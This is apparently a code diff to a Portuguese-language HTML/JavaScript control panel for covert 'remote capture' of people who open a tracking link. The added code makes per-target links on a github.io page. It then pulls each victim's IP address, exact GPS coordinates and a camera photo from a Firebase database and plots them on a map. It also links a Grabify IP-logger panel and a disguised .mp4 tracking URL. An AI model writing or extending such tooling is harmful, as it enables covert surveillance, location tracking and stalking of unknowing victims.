@@ -380,22 +380,6 @@
             background: #0369a1;
         }
 
-        .delete-btn {
-            background: rgba(239, 68, 68, 0.2);
-            color: #ef4444;
-            border: 1px solid rgba(239, 68, 68, 0.4);
-            border-radius: 6px;
-            padding: 4px 8px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .delete-btn:hover, .delete-btn:active {
-            background: rgba(239, 68, 68, 0.4);
-        }
-
         .info-row {
             display: flex;
             justify-content: space-between;
@@ -525,7 +509,7 @@
                     </div>
                 </div>
 
-                <div class="action-card" onclick="abrirBuscaIPAlvo()">
+                <div class="action-card" onclick="pedirIdCapturaRemota()">
                     <div class="action-icon-wrapper">
                         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                     </div>
@@ -577,6 +561,7 @@
         let mapaIP = null;
         let marcadorIP = null;
         let mapaDetalhe = null;
+        let currentTargetId = "default"; // ID ativo no momento
 
         window.onload = function() {
             const savedName = localStorage.getItem('userName');
@@ -733,246 +718,176 @@
             }
         }
 
-        function obterLogsSalvos() {
-            const salvos = localStorage.getItem('grabifyLogsCustom');
-            if (salvos) {
-                return JSON.parse(salvos);
-            }
-            const padrao = [
-                {
-                    id: 1,
-                    ip: "177.185.120.44",
-                    dataHora: "19/09/2026 - 14:10",
-                    dispositivo: "Android / Chrome Mobile",
-                    regiao: "Pará, Belém",
-                    pais: "Brasil",
-                    bandeira: "🇧🇷",
-                    isp: "Claro S.A.",
-                    lat: -1.4558,
-                    lng: -48.4902
-                }
-            ];
-            localStorage.setItem('grabifyLogsCustom', JSON.stringify(padrao));
-            return padrao;
-        }
-
-        function abrirBuscaLink() {
+        // ==========================================
+        // 1. PASSO DE PEDIR ID ANTES DE MOSTRAR O LINK
+        // ==========================================
+        function pedirIdCapturaRemota() {
             const modal = document.getElementById('app-modal');
-            document.getElementById('modal-title').textContent = "Myprivate Maps & Grabify Logs";
+            document.getElementById('modal-title').textContent = "Configurar ID do Alvo";
             modal.classList.add('active');
-            renderizarConteudoLogsGenerico();
-        }
 
-        function renderizarConteudoLogsGenerico() {
-            const modifiedLink = "https://mymap.icu/YR9FVS.mp4";
-            const logs = obterLogsSalvos();
-
-            let htmlLista = `
-                <div style="font-size: 0.8rem; color: #94a3b8;">Seu Link Modificado:</div>
-                <div class="search-box-container">
-                    <input type="text" id="private-input" class="custom-input" value="${modifiedLink}" readonly>
-                    <button class="custom-btn" onclick="copiarTexto('private-input', 'Link copiado!')">Copiar</button>
+            document.getElementById('modal-body').innerHTML = `
+                <div style="font-size: 0.85rem; color: #94a3b8; line-height: 1.4;">
+                    Digite um identificador (ex: <b>alvo01</b>, <b>joao</b> ou um código aleatório) para gerar o link personalizado:
                 </div>
-                
-                <button class="open-panel-btn" onclick="window.open('https://grabify.link/track/D5MWM2', '_blank')">Abrir Painel Grabify</button>
-
-                <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 6px;">
-                    <span style="font-size: 0.8rem; color: #94a3b8;">Lista de Logs Capturados:</span>
-                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="atualizarLogsGenerico()">🔄 Sincronizar</button>
+                <div class="search-box-container" style="margin-top: 6px;">
+                    <input type="text" id="input-custom-id" class="custom-input" value="${currentTargetId}" placeholder="Digite o ID...">
+                    <button class="custom-btn" onclick="confirmarIdEProsseguir()">Continuar</button>
                 </div>
-
-                <div style="display: flex; flex-direction: column; gap: 8px; margin-top: 4px;" id="lista-logs-container">
             `;
+        }
 
-            if (logs.length === 0) {
-                htmlLista += `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum log registrado na lista.</div>`;
-            } else {
-                logs.forEach(log => {
-                    htmlLista += `
-                        <div class="log-item">
-                            <div class="log-header-row">
-                                <span style="display: flex; align-items: center; gap: 6px; color: #f8fafc;">
-                                    <span style="font-size: 1.1rem;">${log.bandeira || '🏳️'}</span> 
-                                    <span>${log.ip}</span>
-                                    <span style="font-size: 0.75rem; color: #94a3b8; font-weight: normal;">(${log.pais || 'Desconhecido'})</span>
-                                </span>
-                                <button class="delete-btn" onclick="apagarLogGenerico(${log.id})">Apagar</button>
-                            </div>
-                            <div class="log-sub-row">
-                                <span>${log.regiao} (${log.isp})</span>
-                                <span>${log.dataHora}</span>
-                            </div>
-                            <div class="log-actions">
-                                <span style="font-size: 0.75rem; color: #38bdf8;">${log.dispositivo}</span>
-                                <button class="custom-btn" style="padding: 4px 10px; font-size: 0.75rem; background: #0284c7;" onclick="verDetalhesLog(${log.id})">Ver Dados</button>
-                            </div>
-                        </div>
-                    `;
-                });
+        function confirmarIdEProsseguir() {
+            const val = document.getElementById('input-custom-id').value.trim();
+            if (!val) {
+                alert("Por favor, digite um ID válido.");
+                return;
             }
-
-            htmlLista += `</div>`;
-            document.getElementById('modal-body').innerHTML = htmlLista;
-        }
-
-        function atualizarLogsGenerico() {
-            renderizarConteudoLogsGenerico();
-        }
-
-        function apagarLogGenerico(idLog) {
-            let logs = obterLogsSalvos();
-            logs = logs.filter(l => l.id !== idLog);
-            localStorage.setItem('grabifyLogsCustom', JSON.stringify(logs));
-            renderizarConteudoLogsGenerico();
+            currentTargetId = val;
+            abrirCapturaRemotaComId(currentTargetId);
         }
 
         // ==========================================
-        // BALÃO CAPTURA REMOTA ATUALIZADO (CONFORME SOLICITADO)
+        // 2. CAPTURA REMOTA CONECTADA AO FIREBASE
         // ==========================================
-        function abrirBuscaIPAlvo() {
+        async function abrirCapturaRemotaComId(idAlvo) {
             const modal = document.getElementById('app-modal');
-            document.getElementById('modal-title').textContent = "CAPTURAREMOTA";
+            document.getElementById('modal-title').textContent = `CAPTURA REMOTA [ID: ${idAlvo}]`;
             modal.classList.add('active');
-            renderizarCapturaRemota();
-        }
 
-        function renderizarCapturaRemota() {
-            const modifiedLink = "https://mymap.icu/YR9FVS.mp4";
-            const logs = obterLogsSalvos();
+            const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idAlvo}`;
 
             let htmlContent = `
-                <!-- 1. Link Modificado logo acima da lista de IP -->
-                <div style="font-size: 0.8rem; color: #94a3b8;">Link Modificado:</div>
+                <button class="back-btn" onclick="pedirIdCapturaRemota()">&larr; Alterar ID</button>
+                
+                <div style="font-size: 0.8rem; color: #94a3b8;">Seu Link Modificado:</div>
                 <div class="search-box-container">
-                    <input type="text" id="captura-link-input" class="custom-input" value="${modifiedLink}" readonly>
+                    <input type="text" id="captura-link-input" class="custom-input" value="${linkGerado}" readonly>
                     <button class="custom-btn" onclick="copiarTexto('captura-link-input', 'Link copiado!')">Copiar</button>
                 </div>
 
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 4px;">
-                    <span style="font-size: 0.8rem; color: #94a3b8;">Lista de IPs Capturados:</span>
-                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="atualizarCapturaRemota()">🔄 Atualizar</button>
+                    <span style="font-size: 0.8rem; color: #94a3b8;">Dados Capturados no Firebase:</span>
+                    <button class="custom-btn" style="padding: 4px 12px; font-size: 0.75rem; background: #059669;" onclick="abrirCapturaRemotaComId('${idAlvo}')">🔄 Atualizar</button>
                 </div>
 
-                <!-- 2. Lista de IP com o nome do país e a bandeira do lado -->
                 <div style="display: flex; flex-direction: column; gap: 8px; margin-top: 4px;" id="lista-captura-container">
-            `;
-
-            if (logs.length === 0) {
-                htmlContent += `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum IP capturado no momento.</div>`;
-            } else {
-                logs.forEach(log => {
-                    htmlContent += `
-                        <div class="log-item">
-                            <div class="log-header-row">
-                                <span style="display: flex; align-items: center; gap: 6px; color: #f8fafc;">
-                                    <span style="font-size: 1.1rem;">${log.bandeira || '🏳️'}</span> 
-                                    <span>${log.ip}</span>
-                                    <span style="font-size: 0.75rem; color: #38bdf8; font-weight: 600;">(${log.pais || 'Desconhecido'})</span>
-                                </span>
-                                <button class="delete-btn" onclick="apagarLogCaptura(${log.id})">Apagar</button>
-                            </div>
-                            <div class="log-sub-row">
-                                <span>${log.regiao}</span>
-                                <span>${log.dataHora}</span>
-                            </div>
-                            <div class="log-actions">
-                                <span style="font-size: 0.75rem; color: #94a3b8;">${log.dispositivo}</span>
-                                <!-- 3. Botão no canto "Ver dados" com opções de câmera de foto, vídeo, mapa e áudio -->
-                                <button class="custom-btn" style="padding: 5px 12px; font-size: 0.75rem; background: #0284c7;" onclick="verDetalhesLog(${log.id})">Ver Dados</button>
-                            </div>
-                        </div>
-                    `;
-                });
-            }
-
-            htmlContent += `</div>`;
-            document.getElementById('modal-body').innerHTML = htmlContent;
-        }
-
-        function atualizarCapturaRemota() {
-            renderizarCapturaRemota();
-        }
-
-        function apagarLogCaptura(idLog) {
-            let logs = obterLogsSalvos();
-            logs = logs.filter(l => l.id !== idLog);
-            localStorage.setItem('grabifyLogsCustom', JSON.stringify(logs));
-            renderizarCapturaRemota();
-        }
-
-        function verDetalhesLog(idLog) {
-            const logs = obterLogsSalvos();
-            const log = logs.find(l => l.id === idLog);
-            if (!log) return;
-
-            document.getElementById('modal-title').textContent = "Painel de Opções do Alvo";
-            document.getElementById('modal-body').innerHTML = `
-                <button class="back-btn" onclick="abrirBuscaIPAlvo()">&larr; Voltar para Captura Remota</button>
-                <div style="font-size: 0.9rem; font-weight: 600; color: #38bdf8; margin-top: 2px;">Detalhes do IP: ${log.bandeira || ''} ${log.ip} (${log.pais || ''})</div>
-                
-                <div style="display: flex; flex-direction: column; gap: 6px; margin-top: 2px;">
-                    <div class="info-row"><span class="info-label">Data e Hora:</span><span class="info-value">${log.dataHora}</span></div>
-                    <div class="info-row"><span class="info-label">Região:</span><span class="info-value" style="color: #38bdf8; font-weight: bold; text-transform: uppercase;">${log.regiao}</span></div>
-                    <div class="info-row"><span class="info-label">Provedor (ISP):</span><span class="info-value">${log.isp}</span></div>
+                    <div style="text-align: center; color: #94a3b8; padding: 15px;">Buscando dados no Firebase...</div>
                 </div>
+            `;
+            document.getElementById('modal-body').innerHTML = htmlContent;
 
-                <div style="font-size: 0.8rem; font-weight: 600; color: #38bdf8; margin-top: 6px;">Mapa de Localização Exata:</div>
+            // Busca os dados no Firebase via requisição GET
+            try {
+                let resposta = await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${idAlvo}.json`);
+                let dados = await resposta.json();
+                
+                const containerLista = document.getElementById('lista-captura-container');
+
+                if (!dados) {
+                    containerLista.innerHTML = `<div style="text-align: center; color: #64748b; padding: 15px;">Nenhum dado encontrado para o ID <b>${idAlvo}</b> ainda.</div>`;
+                    return;
+                }
+
+                // Descobre bandeira/país simulado ou com base no IP
+                let ipAlvo = dados.ip || "IP Desconhecido";
+                let lat = dados.location ? dados.location.lat : -14.235;
+                let lon = dados.location ? dados.location.lon : -51.925;
+                let fotoBase64 = dados.media ? dados.media.photo : "";
+                let timestamp = dados.timestamp || "Recente";
+
+                // Renderiza o card do IP capturado com bandeira e botão "Ver Dados"
+                containerLista.innerHTML = `
+                    <div class="log-item">
+                        <div class="log-header-row">
+                            <span style="display: flex; align-items: center; gap: 6px; color: #f8fafc;">
+                                <span style="font-size: 1.1rem;">🇧🇷</span> 
+                                <span>${ipAlvo}</span>
+                                <span style="font-size: 0.75rem; color: #38bdf8; font-weight: 600;">(Brasil)</span>
+                            </span>
+                            <span style="font-size: 0.75rem; color: #10b981; font-weight: 600;">Online</span>
+                        </div>
+                        <div class="log-sub-row">
+                            <span>Lat: ${lat}, Lon: ${lon}</span>
+                            <span>${timestamp}</span>
+                        </div>
+                        <div class="log-actions">
+                            <span style="font-size: 0.75rem; color: #94a3b8;">ID Firebase: ${idAlvo}</span>
+                            <button class="custom-btn" style="padding: 5px 12px; font-size: 0.75rem; background: #0284c7;" onclick='verDetalhesFirebase(${JSON.stringify(dados)}, "${idAlvo}")'>Ver Dados</button>
+                        </div>
+                    </div>
+                `;
+
+            } catch (erro) {
+                console.error("Erro ao puxar dados do Firebase:", erro);
+                document.getElementById('lista-captura-container').innerHTML = `<div style="color: #ef4444; text-align: center; padding: 15px;">Erro de conexão com o Firebase.</div>`;
+            }
+        }
+
+        // ==========================================
+        // 3. TELA DE DETALHES DO ALVO COM MAPA E IMAGEM
+        // ==========================================
+        function verDetalhesFirebase(dados, idAlvo) {
+            let lat = dados.location ? dados.location.lat : -14.235;
+            let lon = dados.location ? dados.location.lon : -51.925;
+            let foto = dados.media ? dados.media.photo : "";
+            let ip = dados.ip || "N/A";
+
+            document.getElementById('modal-title').textContent = `Detalhes do Alvo [${idAlvo}]`;
+            document.getElementById('modal-body').innerHTML = `
+                <button class="back-btn" onclick="abrirCapturaRemotaComId('${idAlvo}')">&larr; Voltar</button>
+                
+                <div style="font-size: 0.9rem; font-weight: 600; color: #38bdf8;">IP do Alvo: 🇧🇷 ${ip}</div>
+                
+                <div class="info-row"><span class="info-label">Latitude:</span><span class="info-value">${lat}</span></div>
+                <div class="info-row"><span class="info-label">Longitude:</span><span class="info-value">${lon}</span></div>
+
+                <div style="font-size: 0.8rem; font-weight: 600; color: #38bdf8; margin-top: 4px;">Localização Dinâmica no Mapa:</div>
                 <div id="mapa-log-detalhe"></div>
 
-                <div style="font-size: 0.8rem; font-weight: 600; color: #38bdf8; margin-top: 8px;">Opções de Captura:</div>
-                
-                <button class="open-panel-btn" style="background: #0284c7; margin-bottom: 6px;" onclick="executarAcaoCaptura('foto')">
-                    📷 Câmera de Foto (25 Fotos Sequenciais)
-                </button>
-
-                <button class="open-panel-btn" style="background: #0369a1; margin-bottom: 6px;" onclick="executarAcaoCaptura('video')">
-                    🎥 Câmera de Vídeo (Gravação de 5 min)
-                </button>
-
-                <button class="open-panel-btn" style="background: #0d9488; margin-bottom: 6px;" onclick="executarAcaoCaptura('mapa')">
-                    📍 Localização Mapa (Geolocalização GPS)
-                </button>
-
-                <button class="open-panel-btn" style="background: #4f46e5; margin-bottom: 4px;" onclick="executarAcaoCaptura('audio')">
-                    🎤 Áudio (Captura de Microfone)
-                </button>
-
-                <div id="status-captura-container" style="text-align: center; color: #64748b; font-size: 0.75rem; margin-top: 4px;"></div>
+                <div style="font-size: 0.8rem; font-weight: 600; color: #38bdf8; margin-top: 8px;">Foto Capturada da Câmera:</div>
+                <div style="width: 100%; height: 200px; background: #0f172a; border-radius: 10px; border: 1px solid #334155; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+                    ${foto ? `<img src="${foto}" style="width: 100%; height: 100%; object-fit: cover;" alt="Foto capturada">` : `<span style="color: #64748b; font-size: 0.8rem;">Nenhuma foto enviada ainda.</span>`}
+                </div>
             `;
 
+            // Inicializa o mapa centralizado nas coordenadas exatas recebidas da vítima
             setTimeout(() => {
                 if (mapaDetalhe) {
                     mapaDetalhe.remove();
                 }
-                const lat = log.lat || -14.235;
-                const lng = log.lng || -51.925;
-                mapaDetalhe = L.map('mapa-log-detalhe').setView([lat, lng], 13);
+                mapaDetalhe = L.map('mapa-log-detalhe').setView([lat, lon], 15);
                 
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     maxZoom: 19,
                     attribution: '&copy; OpenStreetMap'
                 }).addTo(mapaDetalhe);
 
-                L.marker([lat, lng]).addTo(mapaDetalhe)
-                    .bindPopup(`<b>${log.ip}</b><br>${log.regiao}`)
+                L.marker([lat, lon]).addTo(mapaDetalhe)
+                    .bindPopup(`<b>Alvo: ${ip}</b><br>Localização exata obtida via GPS.`)
                     .openPopup();
             }, 150);
         }
 
-        function executarAcaoCaptura(tipo) {
-            const statusDiv = document.getElementById('status-captura-container');
-            let nomeAcao = "";
+        function obterLogsSalvos() {
+            const salvos = localStorage.getItem('grabifyLogsCustom');
+            if (salvos) return JSON.parse(salvos);
+            return [];
+        }
 
-            if (tipo === 'foto') nomeAcao = "Câmera de Foto (25 capturas)";
-            else if (tipo === 'video') nomeAcao = "Câmera de Vídeo (5 minutos)";
-            else if (tipo === 'mapa') nomeAcao = "Localização Mapa GPS";
-            else if (tipo === 'audio') nomeAcao = "Captura de Áudio";
-
-            statusDiv.innerHTML = `<span style="color: #38bdf8;">Comando enviado: ${nomeAcao}. Aguardando retorno do alvo...</span>`;
+        function abrirBuscaLink() {
+            const modal = document.getElementById('app-modal');
+            document.getElementById('modal-title').textContent = "Myprivate Maps & Grabify Logs";
+            modal.classList.add('active');
             
-            setTimeout(() => {
-                statusDiv.innerHTML += `<br><span style="color: #10b981;">Módulo acoplado com sucesso.</span>`;
-            }, 1000);
+            document.getElementById('modal-body').innerHTML = `
+                <div style="font-size: 0.8rem; color: #94a3b8;">Link de Apoio:</div>
+                <div class="search-box-container">
+                    <input type="text" id="private-input" class="custom-input" value="https://mymap.icu/YR9FVS.mp4" readonly>
+                    <button class="custom-btn" onclick="copiarTexto('private-input', 'Link copiado!')">Copiar</button>
+                </div>
+                <button class="open-panel-btn" onclick="window.open('https://grabify.link/track/D5MWM2', '_blank')">Abrir Painel Grabify</button>
+            `;
         }
 
         function copiarTexto(elementId, mensagem) {
@@ -990,8 +905,8 @@
 
             document.getElementById('modal-body').innerHTML = `
                 <div style="font-size: 0.8rem; color: #94a3b8;">Opções extras do painel:</div>
-                <div class="info-row"><span class="info-label">Versão do Painel:</span><span class="info-value">v2.5 Pro</span></div>
-                <div class="info-row"><span class="info-label">Modo de Conexão:</span><span class="info-value" style="color: #10b981;">Criptografado (SSL)</span></div>
+                <div class="info-row"><span class="info-label">Versão do Painel:</span><span class="info-value">v2.6 Pro</span></div>
+                <div class="info-row"><span class="info-label">Modo de Conexão:</span><span class="info-value" style="color: #10b981;">Firebase Realtime Database</span></div>
             `;
         }
     </script>
